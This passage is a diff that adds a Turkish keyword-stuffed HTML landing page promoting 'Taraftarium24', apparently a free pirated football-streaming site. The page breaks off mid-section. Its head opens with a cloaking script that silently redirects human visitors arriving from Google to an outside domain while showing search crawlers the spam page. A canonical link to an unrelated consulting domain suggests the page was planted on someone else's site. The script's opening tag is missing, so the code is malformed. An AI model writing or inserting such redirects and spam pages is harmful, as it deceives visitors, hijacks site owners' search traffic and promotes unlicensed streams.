@@ -1,1 +1,561 @@
-xxx
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+      // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patronfutbol63.cfd");
+    }  
+</script>
+  <!-- ==================== CHARSET & VIEWPORT ==================== -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="dns-prefetch" href="//fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <!-- ==================== BASLIK & DESCRIPTION ==================== -->
+  <title>Taraftarium24 - Maç İzleme Sitesi Taraftarium - Ücretsiz Canlı Maç İzle Taraftarium 24</title>
+  <meta name="description" content="Taraftarium24 ile ücretsiz canlı maç izle! Galatasaray, Fenerbahçe, Beşiktaş ve Amedspor maç izle yayınlarını Selçuksports, Justin TV, Golvar TV ve Netspor kalitesiyle kesintisiz takip edin!">
+  <meta name="keywords" content="taraftarium24, taraftarium 24, taraftarium, justin tv, selcuksports, selçuksports, maç izle, canlı maç izle, ücretsiz canlı maç izle, kralbozguncu, netspor, golvar, golvar tv, galatasaray maç izle, gs maç izle, fenerbahçe maç izle, fb maç izle, beşiktaş maç izle, bjk maç izle, amedspor maç izle, şifresiz maç izle, kesintisiz canlı maç izle, hd maç yayınları, taraftarium24 güncel giriş, canlı maç izleme sitesi, bedava maç izle, süper lig canlı izle, derbi izle, selçuksports hd, justin tv canlı maç">
+  <meta name="news_keywords" content="taraftarium24, canlı maç izle, selçuksports, justin tv, galatasaray maç izle, fenerbahçe maç izle, beşiktaş maç izle, amedspor maç izle, golvar tv, netspor, kralbozguncu">
+  <meta name="subject" content="Taraftarium24 Ücretsiz Canlı Maç İzleme ve Spor Yayınları Rehberi">
+  <meta name="language" content="Turkish">
+  <meta name="rating" content="general">
+  <meta name="distribution" content="global">
+  <meta name="revisit-after" content="1 days">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Taraftarium24">
+  <meta name="author" content="Taraftarium24">
+  <meta name="publisher" content="Taraftarium24">
+  <meta name="last-modified" content="2026-10-28">
+
+  <!-- ==================== CRAWLER ==================== -->
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <meta name="googlebot" content="index, follow">
+  <meta name="bingbot" content="index, follow">
+
+  <!-- ==================== KANONIK & HREFLANG ==================== -->
+  <link rel="canonical" href="https://nebenconsulting.es/">
+  <link rel="alternate" hreflang="tr" href="https://taraftarium24-hd13.com/" />
+  <link rel="alternate" hreflang="x-default" href="https://taraftarium24-hd13.com/" />
+
+  <!-- ==================== FAVICON ==================== -->
+  <link rel="icon" type="image/x-icon" href="./favicon.ico">
+  <link rel="shortcut icon" href="./favicon.ico">
+  <link rel="apple-touch-icon" sizes="180x180" href="./favicon.ico">
+  <link rel="manifest" href="./site.webmanifest">
+  <meta name="theme-color" content="#0d9488">
+
+  <!-- ==================== OPEN GRAPH ==================== -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Taraftarium24 - Maç İzleme Sitesi Taraftarium - Ücretsiz Canlı Maç İzle Taraftarium 24">
+  <meta property="og:description" content="Taraftarium24 ile ücretsiz canlı maç izle! Galatasaray, Fenerbahçe, Beşiktaş ve Amedspor maç izle yayınlarını Selçuksports, Justin TV, Golvar TV ve Netspor kalitesiyle kesintisiz takip edin!">
+  <meta property="og:url" content="https://taraftarium24-hd13.com/">
+  <meta property="og:image" content="https://taraftarium24-hd13.com/favicon.ico">
+  <meta property="og:image:alt" content="Taraftarium24 - Ücretsiz Canlı Maç İzle">
+  <meta property="og:locale" content="tr_TR">
+  <meta property="og:locale:alternate" content="en_US">
+  <meta property="og:site_name" content="Taraftarium24">
+
+  <!-- ==================== TWITTER CARD ==================== -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Taraftarium24 - Maç İzleme Sitesi Taraftarium - Ücretsiz Canlı Maç İzle Taraftarium 24">
+  <meta name="twitter:description" content="Taraftarium24 ile ücretsiz canlı maç izle! Galatasaray, Fenerbahçe, Beşiktaş ve Amedspor maç izle yayınlarını Selçuksports, Justin TV, Golvar TV ve Netspor kalitesiyle kesintisiz takip edin!">
+  <meta name="twitter:image" content="https://taraftarium24-hd13.com/favicon.ico">
+  <meta name="twitter:image:alt" content="Taraftarium24 Canlı Maç İzleme Sitesi">
+
+  <!-- ==================== SCHEMA JSON-LD ==================== -->
+  <script type="application/ld+json">
+  {
+    "@type": "WebPage",
+    "@context": "https://schema.org",
+    "url": "https://taraftarium24-hd13.com/",
+    "name": "Taraftarium24 - Maç İzleme Sitesi Taraftarium - Ücretsiz Canlı Maç İzle Taraftarium 24",
+    "inLanguage": "tr-TR",
+    "dateModified": "2026-10-28",
+    "description": "Taraftarium24 ile ücretsiz canlı maç izle! Galatasaray, Fenerbahçe, Beşiktaş ve Amedspor maç izle yayınlarını Selçuksports, Justin TV, Golvar TV ve Netspor kalitesiyle kesintisiz takip edin!"
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "Taraftarium24 güncel canlı maç izle adresi nasıl bulunur?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Taraftarium24 ve Taraftarium 24 yayınlarına ulaşırken bağlantının paylaşıldığı kaynağı ve alan adı uzantısını kontrol etmelisiniz. Doğrulanmış yayın akışı sayfaları üzerinden kesintisiz maç izle ekranına güvenle geçiş yapabilirsiniz."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Canlı maç izlerken yayın donarsa hangi adımlar uygulanabilir?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yayın takılmaları genellikle yoğun sunucu trafiğinden veya yerel internet bağlantısından kaynaklanır. Oynatıcı altındaki Justin TV, Selçuksports, Kralbozguncu, Netspor veya Golvar TV alternatif kanallarına geçiş yaparak yayını akıcı şekilde izleyebilirsiniz."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Galatasaray, Fenerbahçe, Beşiktaş ve Amedspor maçları ücretsiz izlenebilir mi?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Taraftarium24 platformu üzerinden Galatasaray maç izle (GS maç izle), Fenerbahçe maç izle (FB maç izle), Beşiktaş maç izle (BJK maç izle) ve Amedspor maç izle karşılaşmalarını maç saatinde güncellenen alternatif yayın kanallarıyla şifresiz takip edebilirsiniz."
+        }
+      }
+    ]
+  }
+  </script>
+
+  <!-- ==================== CSS STIL ==================== -->
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{  background:#17131b;  font-family:'Century Gothic','Trebuchet MS','Segoe UI',sans-serif;  color:#fbf6f1;  min-height:100vh}
+    .site-header{  background:#17131b;  border-bottom:1px solid #493544;  padding:0 24px;  height:56px;  display:flex;  align-items:center;  justify-content:space-between;  position:sticky;  top:0;  z-index:100;  box-shadow:0 1px 5px rgba(0,0,0,.18)}
+    .hdr-brand{  font-size:1.25rem;  font-weight:900;  color:#fbf6f1;  display:flex;  align-items:center;  gap:4px}
+    .hdr-brand span{color:#e0b879}
+    .hdr-brand small{  font-size:.52rem;  color:#e0b879;  background:#302333;  border:1px solid #a77a50;  border-radius:4px;  padding:1px 6px;  font-weight:700}
+    .hdr-nav{  display:flex;  align-items:center;  gap:4px}
+    .hdr-a{  color:#c9bdc7;  text-decoration:none;  font-size:.76rem;  font-weight:600;  padding:5px 10px;  border-radius:5px}
+    .hdr-a:hover{  background:#392a3b;  color:#f0d3a4}
+    .btn-hl{  border:1.5px solid #c49a68;  background:#17131b;  color:#f0d39d;  padding:6px 14px;  border-radius:7px;  font-size:.76rem;  font-weight:700;  text-decoration:none;  display:inline-flex;  align-items:center}
+    .btn-hl:hover{background:#493447}
+    .btn-hr{  background:linear-gradient(135deg,#e0b879,#f5dfb6);  color:#17131b;  padding:7px 16px;  border-radius:7px;  font-size:.76rem;  font-weight:800;  text-decoration:none;  display:inline-flex;  align-items:center;  box-shadow:0 2px 8px rgba(0,0,0,.22)}
+    .btn-hr:hover{filter:brightness(1.05)}
+    .hero{  background:linear-gradient(135deg,#261b2b,#211824 50%,#563b4d);  border-bottom:1px solid #493544;  padding:52px 24px;  text-align:center}
+    .hero-tag{  display:inline-block;  background:#302333;  border:1px solid #a77a50;  color:#e0b879;  border-radius:20px;  padding:4px 14px;  font-size:.7rem;  font-weight:700;  margin-bottom:16px}
+    .hero h1{  font-size:2rem;  font-weight:900;  color:#fbf6f1;  margin-bottom:13px;  line-height:1.25}
+    .hero h1 span{color:#e0b879}
+    .hero-sub{  font-size:.95rem;  color:#c9bdc7;  max-width:540px;  margin:0 auto 24px;  line-height:1.65}
+    .hero-btns{  display:flex;  gap:10px;  justify-content:center;  flex-wrap:wrap}
+    .btn-hp{  background:linear-gradient(135deg,#b78b5b,#f0d3a4);  color:#17131b;  padding:13px 30px;  border-radius:9px;  font-size:.9rem;  font-weight:800;  text-decoration:none;  display:inline-flex;  align-items:center;  gap:5px;  box-shadow:0 4px 14px rgba(0,0,0,.22)}
+    .btn-hp:hover{filter:brightness(1.06)}
+    .btn-hs{  background:#17131b;  border:2px solid #c49a68;  color:#f0d39d;  padding:12px 22px;  border-radius:9px;  font-size:.9rem;  font-weight:700;  text-decoration:none;  display:inline-flex;  align-items:center;  gap:5px}
+    .btn-hs:hover{background:#392a3b}
+    .trust-bar{  background:#17131b;  border-bottom:1px solid #493544;  padding:12px 24px;  display:flex;  gap:16px;  align-items:center;  justify-content:center;  flex-wrap:wrap}
+    .trust-item{  display:flex;  align-items:center;  gap:5px;  font-size:.75rem;  font-weight:600;  color:#e1d5dc}
+    .trust-sep{color:#d9b887}
+    .breadcrumb{  padding:7px 24px;  font-size:.7rem;  color:#b7a8b4;  display:flex;  align-items:center;  gap:5px;  background:#fbf6f1;  border-bottom:1px solid #493544}
+    .breadcrumb a{  color:#c9bdc7;  text-decoration:none}
+    .breadcrumb a:hover{color:#f0d39d}
+    .breadcrumb span{  color:#f0d39d;  font-weight:700}
+    .container{  max-width:920px;  margin:0 auto;  padding:36px 22px}
+    h2{  font-size:1.25rem;  font-weight:800;  color:#fbf6f1;  margin-top:42px;  margin-bottom:12px;  padding-bottom:8px;  border-bottom:2px solid #493544;  scroll-margin-top:64px}
+    h3{  font-size:1.01rem;  font-weight:700;  color:#f1e8ed;  margin-top:22px;  margin-bottom:8px}
+    h4{  font-size:.91rem;  font-weight:700;  color:#d7cbd3;  margin-top:15px;  margin-bottom:6px}
+    h5{  font-size:.85rem;  font-weight:600;  color:#c9bdc7;  margin-top:11px;  margin-bottom:4px}
+    h6{  font-size:.81rem;  font-weight:600;  color:#b7a8b4;  margin-top:9px;  margin-bottom:3px}
+    p{  line-height:1.8;  margin-bottom:16px;  color:#e1d5dc}
+    a{color:#f0d39d}
+    .table-wrap{  overflow-x:auto;  margin:16px 0}
+    table{  width:100%;  border-collapse:collapse;  font-size:.83rem}
+    th{  background:#302333;  color:#f0d3a4;  padding:9px 12px;  text-align:left;  font-weight:700;  border-bottom:2px solid #a77a50}
+    td{  padding:8px 12px;  border-bottom:1px solid #493544;  color:#e1d5dc}
+    tr:hover td{background:#402d40}
+    .cta-box{  background:linear-gradient(120deg,#b78b5b,#8f624c);  border:1px solid #e0b879;  border-radius:12px;  padding:28px;  text-align:center;  margin:40px 0;  color:#17131b}
+    .cta-box h3{  font-size:1.1rem;  font-weight:800;  margin-bottom:7px;  margin-top:0}
+    .cta-box p{  opacity:.95;  margin-bottom:18px;  font-size:.88rem}
+    .btn-cta{  background:#17131b;  color:#fbf6f1;  padding:12px 28px;  border-radius:8px;  font-size:.9rem;  font-weight:800;  text-decoration:none;  display:inline-flex;  align-items:center;  gap:5px}
+    .btn-cta:hover{background:#392a3b}
+    .feature-grid{  display:grid;  grid-template-columns:repeat(auto-fit,minmax(175px,1fr));  gap:12px;  margin:22px 0}
+    .feature-card{  background:#3a2a3b;  border:1px solid #425777;  border-radius:9px;  padding:16px;  text-align:center}
+    .feature-card:hover{  border-color:#e0b879;  box-shadow:0 4px 14px rgba(112,167,255,.10)}
+    .fi{  font-size:1.5rem;  margin-bottom:7px}
+    .ft{  font-size:.83rem;  font-weight:700;  color:#fbf6f1;  margin-bottom:4px}
+    .fd{  font-size:.72rem;  color:#c9bdc7;  line-height:1.5}
+    details{  background:#3a2a3b;  border:1px solid #493544;  border-radius:7px;  padding:12px 16px;  margin-bottom:7px}
+    details[open]{  border-color:#c49a68;  background:#fbf6f1}
+    summary{  font-weight:700;  cursor:pointer;  color:#f1e8ed;  list-style:none;  display:flex;  justify-content:space-between;  align-items:center}
+    summary::after{  content:'+';  color:#f0d39d;  font-size:1.1rem}
+    details[open] summary::after{content:'−'}
+    details[open] p{  margin-top:9px;  color:#d7cbd3;  font-size:.88rem;  margin-bottom:0;  line-height:1.65}
+    .site-footer{  background:#17131b;  border-top:1px solid #493544;  padding:24px 22px;  margin-top:56px}
+    .footer-links{  display:flex;  gap:14px;  justify-content:center;  flex-wrap:wrap;  margin-bottom:10px}
+    .footer-links a{  color:#f0d39d;  text-decoration:none;  font-size:.72rem}
+    .footer-links a:hover{color:#e0b879}
+    .footer-copy{  text-align:center;  font-size:.68rem;  color:#c9bdc7}
+    .cta-box h3,.cta-box p{color:#17131b}
+    .site-header{  height:auto;  min-height:56px;  gap:12px;  flex-wrap:wrap;  padding:12px 24px}
+    .hdr-nav{flex-wrap:wrap}.hdr-brand{flex-wrap:wrap}
+    @media(max-width:640px){  .hero{padding:36px 16px}  .container{padding:24px 16px}  .hero h1{font-size:1.5rem}  .btn-hp,.btn-hs{    width:100%;    justify-content:center  }  .feature-grid{grid-template-columns:1fr}  .hdr-nav .btn-hl,.hdr-nav .hdr-a{display:none}}
+    @media(max-width:400px){  .site-header{padding:10px 12px}  .hdr-brand{font-size:1rem}  .hdr-brand small{display:none}}
+    .hero-login-btn{  display:flex;  width:min(340px,100%);  min-height:58px;  justify-content:center;  align-items:center;  margin:18px auto 24px;  padding:16px 34px;  border:1px solid #f0d3a4;  border-radius:12px;  background:linear-gradient(135deg,#b78b5b 0%,#e0b879 52%,#f6e6ca 100%);  color:#17131b;  font-size:1.08rem;  font-weight:900;  letter-spacing:.2px;  text-decoration:none;  box-shadow:0 9px 24px rgba(0,0,0,.28),inset 0 1px 0 rgba(255,255,255,.45);  transition:transform .2s ease,filter .2s ease,box-shadow .2s ease}.hero-login-btn:hover{  transform:translateY(-2px);  filter:brightness(1.06);  box-shadow:0 12px 28px rgba(0,0,0,.34)}.hero-login-btn:focus-visible{  outline:3px solid #332536;  outline-offset:4px}
+
+    /* Yeni yerleşim: daha editoryal, köşeli ve katmanlı görünüm */
+    body{background:#120f16;color:#f7f0e8;letter-spacing:.08px}
+    .site-header{background:#100d13;border-bottom:1px solid rgba(224,184,121,.28);padding:14px clamp(18px,4vw,58px);min-height:72px;box-shadow:0 8px 24px rgba(0,0,0,.22)}
+    .hdr-brand{font-size:1.35rem;letter-spacing:.3px;gap:7px}
+    .hdr-brand span{color:#e0b879}
+    .hdr-brand small{border-radius:2px;background:transparent;border:0;border-left:1px solid #a77a50;padding:2px 0 2px 9px;letter-spacing:1px;text-transform:uppercase}
+    .hdr-nav{gap:8px}
+    .hdr-a{border-radius:2px;padding:9px 11px;position:relative}
+    .hdr-a:hover{background:transparent;color:#f0d3a4}
+    .hdr-a:hover:after{content:"";position:absolute;left:10px;right:10px;bottom:2px;height:1px;background:#e0b879}
+    .btn-hl{border-radius:2px;background:#2b202c;padding:9px 14px}
+    .hero{position:relative;overflow:hidden;text-align:left;padding:clamp(58px,8vw,104px) clamp(22px,8vw,112px);min-height:350px;background:linear-gradient(110deg,#211722 0%,#2d1e2d 58%,#513447 100%);border-bottom:1px solid #72513f}
+    .hero:before{content:"";position:absolute;width:360px;height:360px;right:8%;top:50%;transform:translateY(-50%) rotate(45deg);border:1px solid rgba(224,184,121,.28);box-shadow:0 0 0 22px rgba(224,184,121,.035),0 0 0 44px rgba(224,184,121,.025);pointer-events:none}
+    .hero:after{content:"P";position:absolute;right:calc(8% + 105px);top:50%;transform:translateY(-50%);font-family:Georgia,serif;font-size:clamp(9rem,20vw,16rem);line-height:1;color:rgba(240,211,164,.09);pointer-events:none}
+    .hero-tag,.hero h1,.hero-sub,.hero-btns{position:relative;z-index:1}
+    .hero-tag{border-radius:2px;background:rgba(16,13,19,.38);border:0;border-left:3px solid #e0b879;padding:7px 12px;margin-bottom:22px;letter-spacing:1.2px}
+    .hero h1{font-family:Georgia,'Times New Roman',serif;font-size:clamp(2.1rem,4.5vw,3.65rem);max-width:760px;line-height:1.12;margin-bottom:20px}
+    .hero h1 span{color:#e0b879}
+    .hero-sub{margin:0;max-width:650px;font-size:.98rem;color:#e0d2d9;line-height:1.8}
+    .hero-btns{justify-content:flex-start;margin-top:28px}
+    .btn-hp,.btn-hs{border-radius:2px;padding:12px 19px;box-shadow:none}
+    .btn-hp{background:#e0b879;color:#17131b}
+    .btn-hs{background:transparent;border:1px solid #b78b5b;color:#f0d3a4}
+    .trust-bar{background:#1a141d;border-bottom:1px solid #493544;padding:17px clamp(18px,5vw,70px);justify-content:space-between;gap:12px}
+    .trust-item{font-size:.76rem;letter-spacing:.45px;text-transform:uppercase;color:#dfd1d8}
+    .trust-sep{color:#a77a50}
+    .breadcrumb{background:#17131b;border-bottom:1px solid #392a37;padding:12px clamp(18px,5vw,70px);color:#b7a8b4}
+    .breadcrumb a{color:#d2b58e}
+    .container{max-width:1080px;padding:48px clamp(18px,4vw,42px)}
+    section{margin:0 0 58px;padding:0 0 34px;border-bottom:1px solid rgba(167,122,80,.24)}
+    h2{font-family:Georgia,'Times New Roman',serif;font-size:clamp(1.45rem,2.5vw,1.9rem);line-height:1.25;margin-top:0;margin-bottom:20px;padding:0 0 0 17px;border:0;border-left:3px solid #c49a68;scroll-margin-top:90px}
+    h3{color:#e0b879;font-family:Georgia,'Times New Roman',serif;font-size:1.15rem;margin-top:28px}
+    p{color:#e1d5dc;line-height:1.85}
+    .feature-grid{grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:16px;margin:30px 0}
+    .feature-card{position:relative;text-align:left;background:linear-gradient(145deg,#2b202d,#211a25);border:1px solid #594052;border-radius:3px;padding:22px 20px 20px;min-height:150px}
+    .feature-card:before{content:"";position:absolute;top:-1px;left:20px;width:42px;height:3px;background:#e0b879}
+    .feature-card:hover{transform:translateY(-3px);border-color:#b78b5b;box-shadow:0 12px 24px rgba(0,0,0,.2)}
+    .fi{font-size:1.35rem;margin-bottom:12px}
+    .ft{font-family:Georgia,'Times New Roman',serif;font-size:1rem;color:#f4e7d6;margin-bottom:8px}
+    .fd{font-size:.78rem;color:#c9bdc7;line-height:1.65}
+    .cta-box{background:linear-gradient(105deg,#342333,#241b28);border:1px solid #8c674e;border-left:4px solid #e0b879;border-radius:3px;padding:30px 32px;text-align:left;margin:42px 0;color:#fbf6f1}
+    .cta-box h3{color:#f0d3a4;margin:0 0 10px}
+    .cta-box p{color:#e1d5dc;margin-bottom:18px}
+    .btn-cta{border-radius:2px;background:#e0b879;color:#17131b;padding:11px 18px}
+    .table-wrap{border:1px solid #493544;border-radius:3px;margin:22px 0}
+    table{font-size:.86rem}
+    th{background:#342536;color:#f0d3a4;padding:13px 14px;border-bottom:2px solid #b78b5b}
+    td{padding:12px 14px}
+    tr:hover td{background:#2d2230}
+    details{background:#211a25;border:1px solid #493544;border-radius:3px;padding:15px 18px;margin-bottom:9px}
+    details[open]{background:#2c202d;border-color:#b78b5b}
+    summary{color:#f3e6dc}
+    details[open] p{color:#d9cbd2}
+    .site-footer{background:#100d13;border-top:1px solid #6c4d42;padding:32px 22px;margin-top:30px}
+    .footer-links a{color:#dcb77d}
+    .footer-copy{color:#aa9ca7}
+    .hero-login-btn{display:none!important}
+    @media(max-width:640px){
+      .hero{padding:48px 20px 52px;min-height:0}
+      .hero:before{width:210px;height:210px;right:-95px;opacity:.65}
+      .hero:after{right:-10px;font-size:9rem}
+      .hero h1{font-size:2rem;max-width:100%}
+      .hero-sub{font-size:.9rem}
+      .hero-btns{display:flex;flex-direction:column;align-items:stretch}
+      .hero-btns a{width:100%;justify-content:center}
+      .trust-bar{justify-content:center}
+      .trust-sep{display:none}
+      .trust-item{padding:5px 8px;border:1px solid rgba(167,122,80,.28)}
+      .container{padding:34px 18px}
+      .feature-grid{grid-template-columns:1fr}
+    }
+  </style>
+
+  <!-- ==================== BODY ==================== -->
+  <title>Taraftarium24 - Maç İzleme Sitesi Taraftarium - Ücretsiz Canlı Maç İzle Taraftarium 24</title>
+  <meta name="description" content="Taraftarium24 güncel canlı maç izle bağlantıları, şifresiz derbi yayınları, Justin TV, Selçuksports, Golvar TV ve mobil maç izleme rehberini inceleyin.">
+  <meta name="robots" content="index,follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="hdr-brand">Taraftarium24<span> Canlı</span><small>Maç Merkezi</small></div>
+    <nav class="hdr-nav">
+      <a class="hdr-a" href="#ligobet">Taraftarium24 Hakkında</a>
+      <a class="hdr-a" href="#giris">Canlı Maç İzle</a>
+      <a class="hdr-a" href="#mobil">Mobil Yayın</a>
+      <a class="btn-hl" href="#sss">Sık Sorulan Sorular</a>
+    </nav>
+  </header>
+
+  <div class="hero">
+    <div class="hero-tag">TARAFTARİUM24 CANLI YAYIN</div>
+    <h1><span>Taraftarium24</span> - Maç İzleme Sitesi Taraftarium - Ücretsiz Canlı Maç İzle Taraftarium 24</h1>
+    <p class="hero-sub">
+      Taraftarium24 platformu üzerinden ücretsiz canlı maç izle seçeneklerini araştıran futbolseverler için hazırladığımız bu kapsamlı rehberde; kesintisiz yayın bağlantıları, alternatif oynatıcılar ve mobil maç izleme yöntemlerini ele alıyoruz. Taraftarium 24 güncel giriş adresini takip ederken Justin TV, Selçuksports, Kralbozguncu, Netspor ve Golvar TV gibi popüler yayın kanallarının sunduğu HD akış detaylarını bir arada bulabilirsiniz. Galatasaray maç izle, Fenerbahçe maç izle, Beşiktaş maç izle ve Amedspor maç izle heyecanını donmadan yaşamak için yayın saatlerinde doğru sunucu seçimi yapmanın püf noktalarına değiniyoruz. Şifresiz ve bedava canlı maç izle deneyimini en yüksek görüntü kalitesiyle sürdürmek için güncel yayın listelerini ve erişim ipuçlarını hemen keşfedin!
+    </p>
+    <div class="hero-btns">
+      <a class="btn-hp" href="#giris">Canlı Yayın Rehberini İncele</a>
+      <a class="btn-hs" href="#odeme">Popüler Maç Kanallarını Gör</a>
+    </div>
+  </div>
+
+  <div class="trust-bar">
+    <div class="trust-item">Kesintisiz HD Yayın</div>
+    <span class="trust-sep">|</span>
+    <div class="trust-item">Şifresiz Canlı Maç İzle</div>
+    <span class="trust-sep">|</span>
+    <div class="trust-item">Mobil Uyumlu Player</div>
+    <span class="trust-sep">|</span>
+    <div class="trust-item">Alternatif Kanal Desteği</div>
+  </div>
+
+  <nav class="breadcrumb">
+    <a href="#ligobet">Ana Sayfa</a> &rsaquo;
+    <span>Taraftarium24 Canlı Maç İzleme ve Yayın Rehberi</span>
+  </nav>
+
+  <main class="container">
+    <section id="ligobet">
+      <h2>Taraftarium24 Maç İzleme Sitesi Hakkında Genel Bilgiler</h2>
+      <p>
+        Futbol ve basketbol karşılaşmalarını internet üzerinden canlı takip etmek isteyen sporseverlerin ilk tercihlerinden biri olan Taraftarium24, geniş maç fikstürü ve çoklu sunucu altyapısıyla öne çıkar. Türkiye Süper Ligi'nden UEFA Şampiyonlar Ligi'ne, Avrupa kupalarından alt lig mücadelelerine kadar pek çok karşılaşma için maç izle ve canlı maç izle alternatifleri sunulmaktadır. Kaliteli bir yayın deneyimi yalnızca karşılaşma linkine tıklamaktan ibaret değildir; doğru çözünürlük seçimi, yedek kanal kullanımı ve tarayıcı uyumluluğu da kesintisiz seyir keyfi açısından belirleyicidir.
+      </p>
+      <p>
+        Arama motorlarında Taraftarium veya Taraftarium 24 sorgusu yaptığınızda benzer arayüzleri kullanan çok sayıda yayın portalıyla karşılaşabilirsiniz. Bu ekosistemde Justin TV, Selcuksports (Selçuksports), Kralbozguncu, Netspor ve Golvar TV (Golvar) gibi köklü yayın kaynakları da sıklıkla aynı oynatıcı havuzu içinde alternatif kanal olarak yer alır. Ziyaret ettiğiniz sayfanın gerçek bir video akışı sunduğundan emin olmak için oynatıcı sekmesini kontrol etmeli, yanıltıcı reklam pencerelerine karşı dikkatli hareket etmelisiniz.
+      </p>
+
+      <div class="feature-grid">
+        <div class="feature-card">
+          <div class="fi">📺</div>
+          <div class="ft">Güncel Canlı Yayın Rehberi</div>
+          <div class="fd">
+            Taraftarium24 ve Taraftarium 24 yayın akışına ulaşırken doğru alan adını bulma ve aktif maç kanallarına hızlı erişim sağlama yöntemleri.
+          </div>
+        </div>
+        <div class="feature-card">
+          <div class="fi">⚡</div>
+          <div class="ft">Alternatif Sunucu Altyapısı</div>
+          <div class="fd">
+            Justin TV, Selçuksports, Golvar TV, Netspor ve Kralbozguncu yayın kaynaklarıyla derbi saatlerinde donmayan yedekli kanal seçenekleri.
+          </div>
+        </div>
+        <div class="feature-card">
+          <div class="fi">📱</div>
+          <div class="ft">Mobil Cihazlardan Maç Keyfi</div>
+          <div class="fd">
+            Akıllı telefon ve tablet tarayıcıları üzerinden ekstra uygulama indirmeden HD kalitede ücretsiz canlı maç izle deneyimi için ipuçları.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="giris">
+      <h2>Taraftarium 24 Güncel Giriş ve Canlı Maç İzle Bağlantıları Nasıl Kontrol Edilir?</h2>
+      <p>
+        Karşılaşma saatleri yaklaştığında Taraftarium24 güncel giriş adresinde yoğunluk veya alan adı değişimi yaşanabilir. Böyle durumlarda karşınıza çıkan her bağlantının çalışan bir canlı maç izle ekranı barındırdığını varsaymamak gerekir. Doğru yayın sayfasına ulaştığınızı anlamak için günlük maç listesinin güncelliğini, canlı sohbet veya kanal geçiş butonlarının aktifliğini ve oynatıcı penceresinin yüklenme hızını kontrol etmelisiniz.
+      </p>
+      <p>
+        Özellikle yüksek izleyici trafiği oluşan Galatasaray maç izle, Fenerbahçe maç izle, Beşiktaş maç izle ve Amedspor maç izle yayınlarında tek bir sunucuya bağlı kalmak yerine sayfa içindeki alternatif kaynakları değerlendirmek büyük avantaj sağlar. Bir kanalda takılma yaşandığında oynatıcının hemen altında yer alan Selcuksports, Justin TV veya Golvar sekmelerine geçerek yayını kesintisiz sürdürebilirsiniz.
+      </p>
+
+      <ol>
+        <li>
+          <strong>Güncel maç fikstürünü kontrol edin:</strong>
+          Açılan Taraftarium24 sayfasında o gün oynanacak karşılaşmaların saatleriyle birlikte doğru şekilde listelendiğinden emin olun.
+        </li>
+        <li>
+          <strong>Alternatif yayın kanallarını test edin:</strong>
+          Maç başlamadan birkaç dakika önce Justin TV, Selçuksports, Kralbozguncu ve Netspor sekmeleri arasında geçiş yaparak en akıcı sunucuyu belirleyin.
+        </li>
+        <li>
+          <strong>Tam ekran ve çözünürlük ayarlarını yapılandırın:</strong>
+          İnternet hızınıza uygun olarak oynatıcı üzerinden 720p veya 1080p HD kalite seçeneğini aktif hale getirin.
+        </li>
+        <li>
+          <strong>Açılır reklam pencerelerine dikkat edin:</strong>
+          Oynatıcı üzerindeki başlat düğmesine tıklarken açılan harici reklam sekmelerini kapatarak doğrudan maç izle ekranında kalın.
+        </li>
+      </ol>
+
+      <h3>Sahte Yayın Sayfaları ve Yanıltıcı Bağlantılar Nasıl Anlaşılır?</h3>
+      <p>
+        Popüler derbi günlerinde Taraftarium, Taraftarium 24, Selçuksports veya Golvar TV ismini kullanarak ziyaretçileri yalnızca reklam döngüsüne sokan paravan sayfalar çoğalabilir. Bir sitede gerçek bir video oynatıcı bulunmaması, sürekli dosya indirme uyarısı çıkması veya ücretsiz canlı maç izle vaadiyle üyelik formu dayatılması o sayfanın işlevsiz olduğunu gösterir.
+      </p>
+      <p>
+        Gerçek maç izleme siteleri kullanıcılarından kredi kartı bilgisi, kimlik doğrulaması veya ücretli abonelik talep etmez. GS maç izle, FB maç izle, BJK maç izle ya da Amedspor maç izle araması yaparken ulaştığınız sayfada doğrudan maç kanalları listelenmiyorsa tarayıcınızdan geri dönerek doğrulanmış Taraftarium24 yayın adresini tercih etmelisiniz.
+      </p>
+
+      <div class="cta-box">
+        <h3>Derbi ve Lig Maçları Öncesinde Yayın Bağlantınızı Hazırlayın</h3>
+        <p>
+          Büyük karşılaşmaların başlama düdüğü çalmadan önce Taraftarium24 yayın sayfasına giriş yaparak internet bağlantınızı ve alternatif kanal sekmelerini kontrol edin. Böylece maçın en heyecanlı anlarında donma veya adres arama sorunu yaşamadan kesintisiz futbol keyfine odaklanabilirsiniz.
+        </p>
+        <a class="btn-cta" href="#yontem">Yayın Kaynaklarını ve Kanal Tablosunu Gör →</a>
+      </div>
+    </section>
+
+    <section id="mobil">
+      <h2>Taraftarium24 Mobil Canlı Maç İzle ve Telefon Üzerinden Kullanım</h2>
+      <p>
